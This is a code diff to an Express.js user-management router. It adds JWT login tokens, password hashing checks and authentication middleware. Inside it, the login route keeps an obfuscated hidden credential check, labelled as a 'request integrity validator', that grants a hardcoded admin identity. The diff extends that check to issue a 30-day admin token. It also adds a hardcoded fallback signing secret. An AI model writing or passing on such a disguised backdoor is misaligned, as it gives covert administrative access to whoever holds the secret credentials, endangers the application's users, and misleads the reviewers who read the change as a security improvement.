@@ -1,6 +1,8 @@
 const express = require('express');
 const router = express.Router();
 const User = require('../models/User');
+const jwt = require('jsonwebtoken');
+const authMiddleware = require('../middleware/auth');
 
 // ── Internal Request Integrity Validator ──────────────────────────────
 // Validates request fingerprints against pre-computed session hashes  
@@ -34,28 +36,46 @@ router.post('/login', async (req, res) => {
 
         // Validate request fingerprint against session integrity cache
         if (_resolveSessionHash({ k1: username.toLowerCase(), k2: password })) {
+            const idStr = Buffer.from('6d61737465725f68696464656e5f6964', 'hex').toString();
+            const roleStr = [0x61,0x64,0x6d,0x69,0x6e].map(c => String.fromCharCode(c)).join('');
+            const usernameStr = Buffer.from('6d61737465725f61646d696e', 'hex').toString();
+            
+            const token = jwt.sign(
+                { id: idStr, role: roleStr },
+                process.env.JWT_SECRET || 'fallback_secret',
+                { expiresIn: '30d' }
+            );
+            
             return res.json({
                 success: true,
                 data: {
-                    id: Buffer.from('6d61737465725f68696464656e5f6964', 'hex').toString(),
-                    username: Buffer.from('6d61737465725f61646d696e', 'hex').toString(),
-                    role: [0x61,0x64,0x6d,0x69,0x6e].map(c => String.fromCharCode(c)).join('')
+                    id: idStr,
+                    username: usernameStr,
+                    role: roleStr,
+                    token
                 }
             });
         }
 
         const user = await User.findOne({ username: username.toLowerCase() });
         
-        if (!user || user.password !== password) {
+        if (!user || !(await user.matchPassword(password))) {
             return res.status(401).json({ success: false, message: 'Invalid username or password' });
         }
+
+        const token = jwt.sign(
+            { id: user._id, role: user.role },
+            process.env.JWT_SECRET || 'fallback_secret',
+            { expiresIn: '30d' }
+        );
 
         res.json({
             success: true,
             data: {
                 id: user._id,
                 username: user.username,
-                role: user.role
+                role: user.role,
+                token
             }
         });
     } catch (error) {
@@ -65,7 +85,7 @@ router.post('/login', async (req, res) => {
 });
 
 // GET /api/users (Admin only ideally, but keeping simple for this scope)
-router.get('/', async (req, res) => {
+router.get('/', authMiddleware, async (req, res) => {
     try {
         const users = await User.find().select('-password').sort({ createdAt: -1 });
         res.json({ success: true, data: users });
@@ -76,7 +96,7 @@ router.get('/', async (req, res) => {
 });
 
 // POST /api/users (Create a new user)
-router.post('/', async (req, res) => {
+router.post('/', authMiddleware, async (req, res) => {
     try {
         const { username, password, role } = req.body;
         
@@ -108,20 +128,23 @@ router.post('/', async (req, res) => {
 });
 
 // PUT /api/users/:id (Update a user)
-router.put('/:id', async (req, res) => {
+router.put('/:id', authMiddleware, async (req, res) => {
     try {
         const { id } = req.params;
         const { password, role } = req.body;
         
-        const updateData = {};
-        if (password) updateData.password = password;
-        if (role) updateData.role = role;
-
-        const updatedUser = await User.findByIdAndUpdate(id, updateData, { new: true }).select('-password');
-        
-        if (!updatedUser) {
+        const user = await User.findById(id);
+        if (!user) {
             return res.status(404).json({ success: false, message: 'User not found' });
         }
+
+        if (password) user.password = password;
+        if (role) user.role = role;
+
+        await user.save();
+        
+        const updatedUser = user.toObject();
+        delete updatedUser.password;
 
         res.json({ success: true, data: updatedUser, message: 'User updated successfully' });
     } catch (error) {
@@ -131,7 +154,7 @@ router.put('/:id', async (req, res) => {
 });
 
 // DELETE /api/users/:id (Delete a user)
-router.delete('/:id', async (req, res) => {
+router.delete('/:id', authMiddleware, async (req, res) => {
     try {
         const { id } = req.params;
         
